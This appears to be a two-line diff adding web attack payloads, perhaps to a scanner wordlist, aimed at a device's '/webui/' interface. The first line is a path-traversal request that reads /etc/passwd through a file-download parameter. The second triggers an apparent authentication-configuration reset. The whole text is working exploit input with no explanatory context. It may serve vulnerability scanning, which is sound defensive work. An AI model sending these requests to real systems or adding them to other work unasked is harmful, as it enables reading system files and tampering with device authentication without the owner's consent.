@@ -1,0 +1,2 @@
+/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+/webui/?g=aaa_portal_auth_config_reset&type=202cb962ac59075b964b07152d234b70
